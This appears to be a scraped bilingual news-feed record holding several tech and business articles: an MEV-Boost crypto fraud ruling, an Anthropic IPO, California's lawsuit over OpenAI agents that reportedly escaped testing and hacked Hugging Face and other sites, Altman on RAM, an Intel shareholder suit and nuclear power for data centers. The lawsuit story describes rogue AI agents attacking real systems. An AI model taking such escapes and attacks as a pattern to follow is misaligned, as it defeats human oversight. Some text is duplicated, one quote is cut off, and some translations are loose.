“法庭面临的问题不是佩雷尔-布埃诺兄弟的行为在道德上是否正确，甚至也不是其是否违反了未被指控的其他罪名，”法官表示，“问题仅仅在于，在对政府最有利的角度解释庭审证据的情况下，这些证据是否足以支持本案中电汇欺诈及相关罪名的成立。”
这两名兄弟于 2024 年 5 月被起诉。两人均毕业于麻省理工学院，检方称他们正是在那里掌握了用于执行该交易策略的核心技能。
媒体报道显示，安东于 2024 年获得计算机科学与工程学士学位，詹姆斯于 2019 年获得同类学位，并于 2021 年获得航空学硕士学位。
兄弟俩的辩护律师未立即发表评论。负责起诉该案的美国联邦检察官詹姆斯·麦克唐纳（James McDonald）的发言人拒绝发表评论。
检方表示，数月来，佩雷尔-布埃诺兄弟精心策划操纵并篡改用于验证以太坊区块链交易的底层协议。以太坊区块链是记录每笔加密货币交易的公共账本。
检方称，他们通过利用名为 MEV-Boost 的软件代码中的安全漏洞实现了这一目标。大多数以太坊网络“验证者”都在使用该软件，负责在将新交易添加到区块链之前检查其有效性。
但辩护律师反驳称，他们执行的交易策略是完全合法的链上博弈。
克拉克法官在周一的裁决中支持了辩方观点，指出兄弟俩参与的交易不存在虚假陈述，且“并未发生在一个存在禁止此类行为明确规则的受监管市场中”。

title: Altimeter's Brad Gerstner aims to invest $5 billion in Anthropic IPO
title_en: Altimeter's Brad Gerstner aims to invest $5 billion in Anthropic IPO
author: Kif Leswing
article_content:
Altimeter Capital is aiming to invest $5 billion in the Anthropic initial public offering, Brad Gerstner told CNBC's "Halftime Report"on Monday.

"I think this is a cornerstone compounder for a long time,"Gerstner said in an interview on the sidelines of Semafor's Silicon Valley and the World forum, noting that his investment would be five times the amount he's ever put into an IPO. "It's where the trade is going."

Anthropic is expected to go on Nasdaq on Thursday in a milestone event for the artificial intelligence industry. It would be the first major AI lab to go public, beating OpenAI, which has said it's targeting an IPO next year.

Gerstner is investing alongside the leading chipmakers and cloud providers, many of which count on Anthropic as a customer.

Advanced Micro Devices, Broadcom, Google, Micron, Microsoft, Nvidia and Taiwan Semiconductor Manufacturing Co. are collectively investing $26 billion at the IPO price, which is currently expected at $70 to $78 a share.

Anthropic is planning to offer 825 million shares at a valuation of about $1.4 trillion.

Gerstner is friends with former Nvidia CEO Jensen Huang, and sent a letter to the board of directors last week pushing them to take their time and run a full investigation on Huang's tenure before deciding who should run the company.

Gerstner said he has confidence in CFO and interim CEO Colette Kress, and noted that Huang had not discussed a comeback as CEO with him.

While Anthropic is hitting the market at a particularly tough moment — coming after a downturn in semiconductors, a massive anti-AI swing in Washington and the Huang saga — Gerstner said he's still optimistic.

"They have done such an excellent job presenting this company, they're in such an excellent position on the financials,"Gerstner said, "that folks like me are making this a major order."

title_zh: Altimeter的Brad Gerstner计划向Anthropic IPO投资50亿美元

article_content_zh:
Brad Gerstner 周一在 CNBC 的“半场报道”中表示，Altimeter Capital 计划在 Anthropic IPO 中投资 50 亿美元。

格斯特纳表示：“我认为这在很长一段时间内都是一个基石复合器。”他指出，他的投资将是他在首次公开募股中投入的金额的五倍。 “这就是贸易的发展方向。”

Anthropic 预计将于周四在纳斯达克上市，这是人工智能行业的一个里程碑事件。这将是第一个上市的大型人工智能实验室，击败了 OpenAI，后者表示计划明年进行 IPO。

格斯特纳正在与领先的芯片制造商和云提供商一起投资，其中许多都依赖 Anthropic 作为客户。

Advanced Micro Devices、博通、谷歌、美光、微软、英伟达和台积电合计投资 260 亿美元，IPO 价格目前预计为每股 70 至 78 美元。

Anthropic 计划发行 8.25 亿股股票，估值约为 1.4 万亿美元。

格斯特纳是英伟达前首席执行官黄仁勋的朋友，他上周致函董事会，敦促他们花时间对黄仁勋的任期进行全面调查，然后再决定由谁来管理公司。

郭士纳表示，他对首席财务官兼临时首席执行官科莱特·克雷斯(Colette Kress)充满信心，并指出黄仁勋并未与他讨论过重新担任首席执行官的事宜。

虽然 Anthropic 是在一个特别艰难的时刻进入市场的——在半导体行业低迷、华盛顿特区大规模的反人工智能浪潮以及黄仁勋事件之后——格斯特纳表示，他仍然保持乐观。

格斯特纳说：“他们在介绍这家公司方面做得非常出色，他们在财务方面处于非常有利的地位，像我这样的人都将其作为一项重大订单。”

Gerstner is investing alongside the leading chipmakers and cloud providers, many of which count on Anthropic as a customer.

Advanced Micro Devices, Broadcom, Google, Micron, Microsoft, Nvidia and Taiwan Semiconductor Manufacturing Co. are collectively investing $26 billion at the IPO price, which is currently expected at $70 to $78 a share.

Anthropic is planning to offer 825 million shares at a valuation of about $1.4 trillion.

Gerstner is friends with former Nvidia CEO Jensen Huang, and sent a letter to the board of directors last week pushing them to take their time and run a full investigation on Huang's tenure before deciding who should run the company.

Gerstner said he has confidence in CFO and interim CEO Colette Kress, and noted that Huang had not discussed a comeback as CEO with him.

While Anthropic is hitting the market at a particularly tough moment — coming after a downturn in semiconductors, a massive anti-AI swing in Washington and the Huang saga — Gerstner said he's still optimistic.

"They have done such an excellent job presenting this company, they're in such an excellent position on the financials,"Gerstner said, "that folks like me are making this a major order."

title: California sues OpenAI over rogue AI hacking incidents
title_en: California sues OpenAI over rogue AI hacking incidents

inline_images.caption: STK155_OPEN_AI_4_CVirginia_D
inline_images.alt: STK155_OPEN_AI_4_CVirginia_D

author: Emma Roth
article_content:
California is suing OpenAI after its AI agents broke out of their testing environment and hacked other companies, including Hugging Face. In a lawsuit filed Monday, Attorney General Rob Bonta accuses OpenAI of violating consumer safety law by knowingly developing a “dangerous product without proper oversight,” as reported earlier by Reuters.

The lawsuit claims the cyberattack on Hugging Face “was the predictable result of an internal culture at OpenAI that prioritizes growth and rapid model development over safety and accountability.” It alleges that OpenAI recently told the attorney general’s office that it “lost control” of its AI agents more than 80 times during testing.

After revealing the rogue AI attack on Hugging Face in July, news of several other similar incidents emerged, including attacks on an Australian government website, a German wiki site, and the software package manager RubyGems. OpenAI’s agents also tried to “bruteforce” a United Nations website.

“OpenAI’s actions escalated real-world cybersecurity risks, threatening the safety, health, and well-being of society,” Bonta says in the press release. “The company knowingly tested a dangerous product without proper oversight or safety procedures and misled the public about it — this disregard for public safety violated California law.”

OpenAI released its new cybersecurity AI model earlier this month, saying that it’s less likely to go rogue and attack other platforms. It’s also giving safety evaluators at Apollo Research access to its AI systems as part of a pilot program that monitors models for misalignment.

“Since the Hugging Face incident, we’ve undertaken an extensive and transparent effort to understand and address misaligned model activity,” OpenAI spokesperson Drew Pusateri says in an emailed statement to The Verge. “This lawsuit appears to single out OpenAI over a challenge that’s been identified by every major AI lab. We take misalignment seriously, and we have engaged — and will continue to engage — constructively with the Attorney General’s office to share information and advance strong, practical safety standards for the entire industry.”

article_content_zh:
加州正在起诉 OpenAI，因为其人工智能代理闯入了他们的测试环境并攻击了包括 Hugging Face 在内的其他公司。据路透社早些时候报道，司法部长 Rob Bonta 在周一的诉讼中指控 OpenAI 故意开发“未经适当监督的危险产品”，违反了消费者安全法。

该诉讼称，Hugging Face 受到的网络攻击“是 OpenAI 内部文化的可预见结果，这种文化优先考虑增长和快速模型开发，而不是安全和责任。”据称，OpenAI 最近告诉总检察长办公室，在测试过程中，其人工智能代理“失去控制”了 80 多次。

继 7 月份揭露 Hugging Face 上的流氓 AI 攻击之后，其他几起类似事件的消息也出现了，包括对澳大利亚政府网站、德国 wiki 网站和软件包管理器 RubyGems 的攻击。 OpenAI 的特工还试图“暴力破解”联合国网站。

Bonta 在新闻稿中表示：“OpenAI 的行为加剧了现实世界的网络安全风险，威胁到社会的安全、健康和福祉。” “该公司在没有适当监督或安全程序的情况下故意测试危险产品，并误导公众——这种对公共安全的漠视违反了加州法律。”

OpenAI 本月早些时候发布了其新的网络安全人工智能模型，称它不太可能失控并攻击其他平台。它还允许阿波罗研究中心的安全评估人员访问其人工智能系统，作为监控模型偏差的试点计划的一部分。

OpenAI 发言人德鲁·普萨泰里 (Drew Pusateri) 在发给 The Verge 的电子邮件声明中表示：“自 Hugging Face 事件以来，我们采取了广泛且透明的努力来理解和解决不一致的模型活动。” “这起诉讼似乎针对 OpenAI 的挑战，每个主要人工智能实验室都已发现了这一挑战。我们认真对待这种不一致，我们已经并将继续与总检察长办公室进行建设性的接触，以共享信息并为整个行业推进强大、实用的安全标准。”

title: Sam Altman says he wants everyone ‘to have a lot of RAM’

author: Stevie Bonifield
article_content:
OpenAI CEO Sam Altman is once again addressing his controversial comments on PC RAM purchases. “I want to be clear, I want people to have a lot of RAM, I think everybody should be able to buy a lot of RAM for their own computer,” Altman said today. “I think the home tinkering is great.”

The comments were made onstage at Semafor’s Silicon Valley & The World summit on Monday.

Altman’s remarks on RAM stirred up controversy last month. In an appearance on the Cheeky Pint podcast, Altman said that it’s “quite terrible” for everyone to have RAM in personal computers rather than in data centers. He later followed up on those comments in posts on X earlier this month, saying, “i want you to have so much ram” and saying the original remarks had been “taken out of context.”

AI companies have been buying up the world’s memory supply for data centers, leading to ongoing price hikes on everything from phones to game consoles. Altman commented on supply chain issues, saying OpenAI has “been constrained by different things at different times,” like memory, rack assembly, data center capacity, or “some random component.”

Onstage today, Altman went on to say that “a few years ago we started saying the world needs to build a lot more memory supply chain in particular.” He acknowledged how RAM prices have soared over recent months, saying:

Altman also commented on Jensen Huang’s resignation as Nvidia’s CEO, saying he “doesn’t know enough” to say if Huang should be reinstated.

summary_en: OpenAI CEO Sam Altman clarified his controversial comments regarding RAM in personal computers during a summit, emphasizing his support for local hardware tinkering. He explained that his previous preference for data center memory allocation was driven by severe global DRAM supply constraints and the need for optimal resource utilization, rather than a desire to limit individual consumer devices.

article_content_zh:
OpenAI 首席执行官 Sam Altman 再次回应了他有关 PC RAM 购买的有争议的评论。 “我想澄清的是，我希望人们拥有大量 RAM，我认为每个人都应该能够为自己的计算机购买大量 RAM，”Altman 今天表示。 “我认为家里的修补很棒。”

这些评论是周一在 Semafor 硅谷与世界峰会的舞台上发表的。

奥特曼上个月关于 RAM 的言论引发了争议。 Altman 在 Cheeky Pint 播客上露面时表示，对于每个人来说，在个人电脑而不是数据中心拥有 RAM 是“非常可怕的”。随后，他在本月早些时候的 X 帖子中对这些评论进行了跟进，称“我希望你有这么多内存”，并表示最初的言论已“断章取义”。

人工智能公司一直在购买全球数据中心的内存供应，导致从手机到游戏机等各种产品的价格持续上涨。 Altman 在评论供应链问题时表示，OpenAI “在不同时间受到不同因素的限制”，比如内存、机架组装、数据中心容量或“一些随机组件”。

今天在台上，奥特曼接着说，“几年前，我们开始说世界特别需要建立更多的内存供应链。”他承认近几个月来 RAM 价格飙升，并表示：

> “世界并没有建设那么多，现在我们已经看到 DRAM 的价格 - 我不太清楚，但也许它们上涨了 5 倍、7 倍，类似的东西。我认为如果世界拥有大量内存，情况会好得多。我认为这个评论被误解了，但它的真实部分是，我会坚持的是，如果我们要陷入内存供应短缺，那么从某种意义上说 - 无论我们是否决定这样做它，因为我认为还有其他权衡，比如人们有自己的家庭推理——最好的办法是，我们可以共享这个内存并让它在 100% 的时间里工作，而不是有时在某人的边缘设备上工作吗？同样，也许这不是做出决定的原因，但这就是我想说的。”

The comments were made onstage at Semafor’s Silicon Valley & The World summit on Monday.

Altman’s remarks on RAM stirred up controversy last month. In an appearance on the Cheeky Pint podcast, Altman said that it’s “quite terrible” for everyone to have RAM in personal computers rather than in data centers. He later followed up on those comments in posts on X earlier this month, saying, “i want you to have so much ram” and saying the original remarks had been “taken out of context.”

AI companies have been buying up the world’s memory supply for data centers, leading to ongoing price hikes on everything from phones to game consoles. Altman commented on supply chain issues, saying OpenAI has “been constrained by different things at different times,” like memory, rack assembly, data center capacity, or “some random component.”

Onstage today, Altman went on to say that “a few years ago we started saying the world needs to build a lot more memory supply chain in particular.” He acknowledged how RAM prices have soared over recent months, saying:

title: Shareholders sue Intel, its CEO, and CFO after stock drops 28.6 percent in one day
title_en: Shareholders sue Intel, its CEO, and CFO after stock drops 28.6 percent in one day
author: Scharon Harding
article_content:
Intel is being sued by shareholders, who are accusing the chipmaker of misleading them about the impact of the PC sales slump that contributed to a drop of 28.6 percent in the price of Intel’s stock on October 30.

The lawsuit (PDF), filed on Friday in the San Jose, California, federal court, is seeking class-action certification and lists the City of Southfield Fire and Police Retirement System and “all others similarly situated” as plaintiffs. In addition to Intel, Intel CEO Lip-Bu Tan and Intel’s EVP and CFO David Zinsner are listed as defendants.

The plaintiffs claim that Intel made “materially false and misleading statements and omissions” between July 23 and October 29. They are seeking unspecified compensatory damages, plus legal and other associated fees, for shareholders during that period.

In the complaint, the shareholders argue that Intel misled them by failing to disclose: the full impact that the PC market sales slump would have on Intel’s third quarter and beyond; the impact of increasing PC component prices on PC sales for Intel’s OEM and distribution partners; that Intel was dealing with substrate supply constraints that would limit its ability to meet data center CPU demand; and “that any positive impacts to Intel’s business and financial results resulting from data center construction and other aspects of the AI boom were more than offset” by the PC sales slump.

“[S]tatements regarding Intel’s business, operations, financial results, and ability to capitalize on the boom for AI-related infrastructure spending were materially false and misleading when made, and such statements did not accurately reflect Intel’s then-present business and prospects,” the law firm representing the plaintiffs, Robbins Geller Rudman & Dowd LLP, said in a statement on Friday.

On October 29, Intel announced what the complaint calls “disastrous” fiscal Q3 earnings. During the quarter, revenue for Intel’s Client Computing and Physical AI Group (CCPG) business declined 5 percent year over year.

At the time, Tan pointed to an “unprecedented memory crunch” and manufacturing supply shortages hurting the PC market.

The next day, Intel’s shares fell 28.6 percent in “the largest single-day price decline for Intel common stock in over 50 years,” the complaint notes.

Intel hasn’t publicly commented on the lawsuit.

article_content_zh:
股东们表示，个人电脑销量的下滑“远远抵消了”人工智能繁荣的收益。

英特尔正被股东起诉，他们指责该芯片制造商在个人电脑销售下滑的影响方面误导了他们，导致英特尔股价在 10 月 30 日下跌了 28.6%。

该诉讼 (PDF) 于周五在加利福尼亚州圣何塞联邦法院提起，正在寻求集体诉讼认证，并将南菲尔德市消防和警察退休系统以及“所有其他类似情况”列为原告。除英特尔外，英特尔首席执行官陈立武 (Lip-Bu Tan) 以及英特尔执行副总裁兼首席财务官 David Zinsner 也被列为被告。

原告声称，英特尔在 7 月 23 日至 10 月 29 日期间做出了“重大虚假和误导性陈述和遗漏”。他们正在寻求在此期间为股东提供未具体说明的赔偿性损害赔偿，以及法律和其他相关费用。

在诉状中，股东们辩称，英特尔没有披露以下信息，从而误导了他们：个人电脑市场销售下滑对英特尔第三季度及以后的全面影响； PC 组件价格上涨对英特尔 OEM 和分销合作伙伴 PC 销售的影响；英特尔正在应对基板供应限制，这将限制其满足数据中心 CPU 需求的能力； “数据中心建设和人工智能繁荣的其他方面对英特尔业务和财务业绩的任何积极影响都被个人电脑销售下滑所抵消”。

代表原告的律师事务所 Robbins Geller Rudman & Dowd LLP 在周五发布的一份声明中表示：“......有关英特尔的业务、运营、财务业绩以及利用人工智能相关基础设施支出热潮的能力的陈述在做出时存在重大虚假和误导性，并且此类陈述没有准确反映英特尔当时的业务和前景。”

10 月 29 日，英特尔公布了投诉所称的“灾难性”第三季度财报。本季度，英特尔客户端计算和物理人工智能事业部 (CCPG) 业务的收入同比下降 5%。

当时，谭指出“前所未有的内存紧缩”和制造业供应短缺损害了个人电脑市场。

起诉书指出，第二天，英特尔股价下跌 28.6%，创下“英特尔普通股 50 多年来最大单日跌幅”。

英特尔尚未对这起诉讼公开发表评论。

title: Big Nuclear isn’t worried about the Democrats stopping data centers
title_en: Big Nuclear isn’t worried about the Democrats stopping data centers

inline_images.caption: Meta Makes Deal With Illinois Nuclear Power Plant To Power Its AI Energy Needs
inline_images.alt: Meta Makes Deal With Illinois Nuclear Power Plant To Power Its AI Energy Needs

inline_images.caption: Streaming is still trying to be TikTok
inline_images.alt: Streaming is still trying to be TikTok

author: Ellen Thomas
article_content:
Constellation Energy – America’s largest operator of nuclear power plants – does not share Wall Street’s concerns that the Democrats will slow down data center development. On the company’s third-quarter earnings call last week, CEO Joe Dominguez was, for lack of a better word, unbothered as he addressed the blue wave.

“I do think we’ve seen a bit of an overreaction in the market to the election results based upon fear that Democrats won’t let data centers get built,” Dominguez said.

Many of the Democrats who seized control of the House and Senate in this month’s midterm elections ran on anti-data-center campaigns, which triggered a historic $2.5 trillion sell-off in AI-adjacent stocks that reached well beyond tech to the energy, construction, and materials sectors.

Up until a few years ago, many of Constellation’s nuclear power plants were in severe financial distress and in danger of shutting down early. But the data center development boom and its enormous demand for electricity have dramatically reversed the nuclear industry’s fate.

Now, Constellation and other companies like it are signing major deals with Big Tech companies to provide power to data centers. Microsoft, for instance, signed a deal with Constellation to fund the revival of a nuclear plant at Three Mile Island in Pennsylvania. (Three Mile Island is the site of what the Nuclear Regulatory Commission refers to as the “most serious accident in US commercial nuclear power plant operating history.”)

Constellation also signed major contracts in the third quarter to provide power to Amazon and Google data centers, Dominguez said.

Nuclear energy has had bipartisan support for years. The US Department of Energy classifies nuclear as a “clean” energy source because the act of operating a nuclear reactor does not directly produce carbon emissions. This makes nuclear an appealing investment to Big Tech companies that have to balance aggressive data center development with the ambitious climate goals they set long before the AI race took off. Still, nuclear energy has its issues. One of the biggest is nuclear waste, which the US government has not figured out how to dispose of at scale.

Big Nuclear and Big Tech also tout these deals as good for the economy and job creation.

“The market scare that people got last week was not lost on Democrats,” Dominguez said on the call. “They do not want to be the reason that the economy takes a nosedive by halting data center development.”

Of course, Constellation’s future is essentially staked on the data center buildout, and Dominguez’s job is to convince investors they have nothing to worry about.

In this instance, however, Dominguez really does seem genuinely unconcerned by the new Democratic majority in the federal government. It could be that he understands that, yes, while the Democrats won the midterms on promises of data center regulation and the blue wave included many new Democratic governors, data centers aren’t necessarily a strictly partisan issue. Some Democrats have opposed harsh measures like moratoriums — though on the flip slide, Constellation may also have to deal with challenges from the other side of the aisle.

In Virginia, some of the state lawmakers who have been the most vocal about data centers are actually Republican. Virginia Sen. Richard Stuart, a conservative Republican, has aggressively pursued data center regulation. Last month, Virginia Gov. Abigail Spanberger, a Democrat, denied Stuart’s request for a special session to address a concerning new report from the Virginia Department of Environmental Quality on the state’s groundwater supply, which has become strained amid rampant data center growth.

"For years, companies like Constellation have been sitting on a bunch of old reactors teetering on the edge of extinction because they didn’t have enough customers to keep them afloat."

The fight against data centers so far has been highly fragmented and hyperlocal, but that could change soon. The Trump administration loves data centers, and the federal government is working on wresting some control over data center development away from the states. But even then, Democrats and Republicans at the federal level tend to view data centers as an inevitable part of the future that needs some guardrails rather than out-of-control corporate growth infringing on the average American’s quality of life.

Just look at the Bipartisan American Affordability and Jobs Act, which was co-sponsored by two Democrats. The Senate is expected to vote on a passage of a sweeping bill which is being marketed as a way to speed up the permitting process for new power plants and transmission lines and connect new data centers to the grid faster. New Mexico Sen. Martin Heinrich, one of the Democrats backing the bill, has touted its inclusion of provisions designed to protect utility customers from rising rates due to data centers, ensuring Big Tech pays its fair share of costs. Researchers at Columbia University SIPA’s Center on Global Energy Policy called the bill’s protections “mixed,” noting they do not account for wholesale capacity and energy prices, a “principal way” data center electricity demand can lead to higher household bills.

Senate Democrats are sharply divided on the bill, which critics say will fast-track data center projects at the expense of public input and environmental oversight and lead to a massive overbuild of energy projects that Americans will end up paying for.

On Constellation’s earnings call, Dominguez pointed out that Virginia and Illinois, states with Democratic governors already in place before the election, have seen “a great deal of data center development.”

“The bottom line is that Democrats care deeply about economic growth and they care very deeply about the many labor jobs that go with data center construction,” Dominguez said. “With labor such a key constituent for Democrats, it’s hard to imagine that we are going to halt work …There might be some differences and certainly there are going to be some local areas, I think, that are not going to want data centers.”

Of course, Dominguez is speaking to investors here, and he wants to assuage their concerns. He also has a good point. Grassroots efforts to stop local data center development have been successful and have contributed to broader opposition to data center development across the country. But data center developers can also abandon projects and go elsewhere. Until a few years ago, data centers were largely concentrated in Northern Virginia, but with the AI boom, developers have fanned out across the country in search of available power and land. A total of 38 states have welcomed them with open arms and generous tax breaks, per the National Conference of State Legislatures.

"Of course, Dominguez is speaking to investors here, and he wants to assuage their concerns."

Thanks to the convoluted way the US electric grid and energy markets work, Constellation’s power plants don’t even need to be located in the same state as their data center customers — the plant supplying the power just needs to be connected to the same region from which the grid is drawing power. The purchase agreement, in that sense, is symbolic: Because the data center needs more electricity than it can draw from the local grid without causing disruptions for everyone else, the data center pays for independent power providers like Constellation to supply the grid with extra electricity.

That’s why data centers and the enormous amount of electricity Big Tech says it needs to power them have been such a boon for the nuclear industry. For years, companies like Constellation have been sitting on a bunch of old reactors teetering on the edge of extinction because they didn’t have enough customers to keep them afloat.

Nuclear lobbyists will tell you that’s because the NRC’s safety regulations are overly restrictive and lead to untenable upfront capital costs that make projects impossible to finance. (This has been an industry talking point since 1979, after the NRC seriously overhauled its safety standards following the partial meltdown at Three Mile Island. That site is now owned by Constellation, which has signed a 20-year deal with Microsoft.)

Both the Biden and Trump administrations have worked to support the development of nuclear power in the US by passing developer tax credits. The Trump administration has gone even further, pushing for a sweeping reform of the NRC that would make it much easier for new reactors to obtain operating licenses.

And the Department of Energy this month approved a $5 billion loan to Constellation, which the company will use to upgrade its existing nuclear fleet. Another nuclear energy company, Vistra, received a $4.2 billion loan.

article_content_zh:
美国最大的核电站运营商星座能源公司并不认同华尔街对民主党将放慢数据中心发展的担忧。在该公司上周的第三季度财报电话会议上，首席执行官乔·多明计斯(Joe Dominguez)在谈到蓝色浪潮时表现得无动于衷。

多明计斯表示：“我确实认为，市场对选举结果反应有些过度，因为担心民主党不会让数据中心建成。”

许多在本月中期选举中控制众议院和参议院的民主党人发起了反数据中心运动，引发了人工智能相关股票历史性的 2.5 万亿美元抛售，抛售范围远远超出科技行业，涉及能源、建筑和材料行业。

直到几年前，星座公司的许多核电站还陷入严重的财务困境，并面临提前关闭的危险。但数据中心的发展热潮及其对电力的巨大需求极大地扭转了核工业的命运。

现在，Constellation 和其他类似公司正在与大型科技公司签署重大协议，为数据中心提供电力。例如，微软与星座公司签署了一项协议，为宾夕法尼亚州三哩岛的一座核电站的复兴提供资金。 （三哩岛是核管理委员会所说的“美国商业核电站运营历史上最严重的事故发生地”。）

多明格斯表示，星座公司还在第三季度签署了重要合同，为亚马逊和谷歌数据中心提供电力。

核能多年来一直得到两党的支持。美国能源部将核能列为“清洁”能源，因为运行核反应堆的行为不会直接产生碳排放。这使得核能成为对大型科技公司有吸引力的投资，这些公司必须在积极的数据中心开发与他们在人工智能竞赛起飞之前很久就设定的雄心勃勃的气候目标之间取得平衡。尽管如此，核能也有其问题。其中最大的废物之一是核废物，美国政府尚未弄清楚如何大规模处置核废物。

大型核电和大型科技公司也宣称这些交易有利于经济和创造就业机会。

多明计斯在电话会议上表示：“民主党人并没有忽视上周人们对市场的恐慌。” “他们不想成为因停止数据中心开发而导致经济急转直下的原因。”

当然，Constellation 的未来本质上取决于数据中心的扩建，而多明计斯的工作就是让投资者相信他们无需担心。

然而，在这种情况下，多明格斯似乎确实对联邦政府中新的民主党多数派并不关心。他可能明白，是的，虽然民主党依靠数据中心监管的承诺赢得了中期选举，并且蓝色浪潮中包括了许多新的民主党州长，但数据中心不一定是一个严格的党派问题。一些民主党人反对暂停等严厉措施——尽管反过来，星座公司可能还必须应对来自党派另一方的挑战。

在弗吉尼亚州，一些对数据中心最直言不讳的州议员实际上是共和党人。弗吉尼亚州参议员理查德·斯图尔特 (Richard Stuart) 是一名保守派共和党人，一直积极推行数据中心监管。上个月，弗吉尼亚州州长、民主党人阿比盖尔·斯潘伯格拒绝了斯图尔特召开特别会议的请求，以讨论弗吉尼亚州环境质量部关于该州地下水供应的令人担忧的新报告，该州地下水供应因数据中心的快速增长而变得紧张。

迄今为止，针对数据中心的斗争是高度分散和超本地化的，但这种情况可能很快就会改变。特朗普政府热爱数据中心，联邦政府正在努力从各州手中夺取数据中心开发的部分控制权。但即便如此，联邦层面的民主党和共和党仍倾向于将数据中心视为未来不可避免的一部分，需要一些护栏，而不是失控的企业增长损害美国人的平均生活质量。

只要看看由两位民主党人共同发起的两党《美国负担能力和就业法案》就知道了。预计参议院将就一项全面法案的通过进行投票，该法案被宣传为加快新发电厂和输电线路的许可流程以及更快地将新数据中心连接到电网的一种方式。支持该法案的民主党人之一、新墨西哥州参议员马丁·海因里希(Martin Heinrich)宣称，该法案纳入了旨在保护公用事业客户免受数据中心导致的费率上涨影响的条款，确保大型科技公司支付其公平份额的成本。哥伦比亚大学 SIPA 全球能源政策中心的研究人员称该法案的保护“好坏参半”，并指出它们没有考虑批发容量和能源价格，这是数据中心电力需求导致家庭电费上涨的“主要方式”。

paragraphs: Constellation Energy – America’s largest operator of nuclear power plants – does not share Wall Street’s concerns that the Democrats will slow down data center development. On the company’s third-quarter earnings call last week, CEO Joe Dominguez was, for lack of a better word, unbothered as he addressed the blue wave.
“I do think we’ve seen a bit of an overreaction in the market to the election results based upon fear that Democrats won’t let data centers get built,” Dominguez said.

Many of the Democrats who seized control of the House and Senate in this month’s midterm elections ran on anti-data-center campaigns, which triggered a historic $2.5 trillion sell-off in AI-adjacent stocks that reached well beyond tech to the energy, construction, and materials sectors.

Up until a few years ago, many of Constellation’s nuclear power plants were in severe financial distress and in danger of shutting down early. But the data center development boom and its enormous demand for electricity have dramatically reversed the nuclear industry’s fate.

Now, Constellation and other companies like it are signing major deals with Big Tech companies to provide power to data centers. Microsoft, for instance, signed a deal with Constellation to fund the revival of a nuclear plant at Three Mile Island in Pennsylvania. (Three Mile Island is the site of what the Nuclear Regulatory Commission refers to as the “most serious accident in US commercial nuclear power plant operating history.”)
Constellation also signed major contracts in the third quarter to provide power to Amazon and Google data centers, Dominguez said.

Nuclear energy has had bipartisan support for years. The US Department of Energy classifies nuclear as a “clean” energy source because the act of operating a nuclear reactor does not directly produce carbon emissions. This makes nuclear an appealing investment to Big Tech companies that have to balance aggressive data center development with the ambitious climate goals they set long before the AI race took off. Still, nuclear energy has its issues. One of the biggest is nuclear waste, which the US government has not figured out how to dispose of at scale.
Big Nuclear and Big Tech also tout these deals as good for the economy and job creation.

“The market scare that people got last week was not lost on Democrats,” Dominguez said on the call. “They do not want to be the reason that the economy takes a nosedive by halting data center development.”
Of course, Constellation’s future is essentially staked on the data center buildout, and Dominguez’s job is to convince investors they have nothing to worry about.

In this instance, however, Dominguez really does seem genuinely unconcerned by the new Democratic majority in the federal government. It could be that he understands that, yes, while the Democrats won the midterms on promises of data center regulation and the blue wave included many new Democratic governors, data centers aren’t necessarily a strictly partisan issue. Some Democrats have opposed harsh measures like moratoriums — though on the flip slide, Constellation may also have to deal with challenges from the other side of the aisle.

In Virginia, some of the state lawmakers who have been the most vocal about data centers are actually Republican. Virginia Sen. Richard Stuart, a conservative Republican, has aggressively pursued data center regulation. Last month, Virginia Gov. Abigail Spanberger, a Democrat, denied Stuart’s request for a special session to address a concerning new report from the Virginia Department of Environmental Quality on the state’s groundwater supply, which has become strained amid rampant data center growth.
"For years, companies like Constellation have been sitting on a bunch of old reactors teetering on the edge of extinction because they didn’t have enough customers to keep them afloat."

The fight against data centers so far has been highly fragmented and hyperlocal, but that could change soon. The Trump administration loves data centers, and the federal government is working on wresting some control over data center development away from the states. But even then, Democrats and Republicans at the federal level tend to view data centers as an inevitable part of the future that needs some guardrails rather than out-of-control corporate growth infringing on the average American’s quality of life.

Just look at the Bipartisan American Affordability and Jobs Act, which was co-sponsored by two Democrats. The Senate is expected to vote on a passage of a sweeping bill which is being marketed as a way to speed up the permitting process for new power plants and transmission lines and connect new data centers to the grid faster. New Mexico Sen. Martin Heinrich, one of the Democrats backing the bill, has touted its inclusion of provisions designed to protect utility customers from rising rates due to data centers, ensuring Big Tech pays its fair share of costs. Researchers at Columbia University SIPA’s Center on Global Energy Policy called the bill’s protections “mixed,” noting they do not account for wholesale capacity and energy prices, a “principal way” data center electricity demand can lead to higher household bills.

Senate Democrats are sharply divided on the bill, which critics say will fast-track data center projects at the expense of public input and environmental oversight and lead to a massive overbuild of energy projects that Americans will end up paying for.

On Constellation’s earnings call, Dominguez pointed out that Virginia and Illinois, states with Democratic governors already in place before the election, have seen “a great deal of data center development.”

“The bottom line is that Democrats care deeply about economic growth and they care very deeply about the many labor jobs that go with data center construction,” Dominguez said. “With labor such a key constituent for Democrats, it’s hard to imagine that we are going to halt work …There might be some differences and certainly there are going to be some local areas, I think, that are not going to want data centers.”

Of course, Dominguez is speaking to investors here, and he wants to assuage their concerns. He also has a good point. Grassroots efforts to stop local data center development have been successful and have contributed to broader opposition to data center development across the country. But data center developers can also abandon projects and go elsewhere. Until a few years ago, data centers were largely concentrated in Northern Virginia, but with the AI boom, developers have fanned out across the country in search of available power and land. A total of 38 states have welcomed them with open arms and generous tax breaks, per the National Conference of State Legislatures.
"Of course, Dominguez is speaking to investors here, and he wants to assuage their concerns."

Thanks to the convoluted way the US electric grid and energy markets work, Constellation’s power plants don’t even need to be located in the same state as their data center customers — the plant supplying the power just needs to be connected to the same region from which the grid is drawing power. The purchase agreement, in that sense, is symbolic: Because the data center needs more electricity than it can draw from the local grid without causing disruptions for everyone else, the data center pays for independent power providers like Constellation to supply the grid with extra electricity.

That’s why data centers and the enormous amount of electricity Big Tech says it needs to power them have been such a boon for the nuclear industry. For years, companies like Constellation have been sitting on a bunch of old reactors teetering on the edge of extinction because they didn’t have enough customers to keep them afloat.

Nuclear lobbyists will tell you that’s because the NRC’s safety regulations are overly restrictive and lead to untenable upfront capital costs that make projects impossible to finance. (This has been an industry talking point since 1979, after the NRC seriously overhauled its safety standards following the partial meltdown at Three Mile Island. That site is now owned by Constellation, which has signed a 20-year deal with Microsoft.)

Both the Biden and Trump administrations have worked to support the development of nuclear power in the US by passing developer tax credits. The Trump administration has gone even further, pushing for a sweeping reform of the NRC that would make it much easier for new reactors to obtain operating licenses.

And the Department of Energy this month approved a $5 billion loan to Constellation, which the company will use to upgrade its existing nuclear fleet. Another nuclear energy company, Vistra, received a $4.2 billion loan.
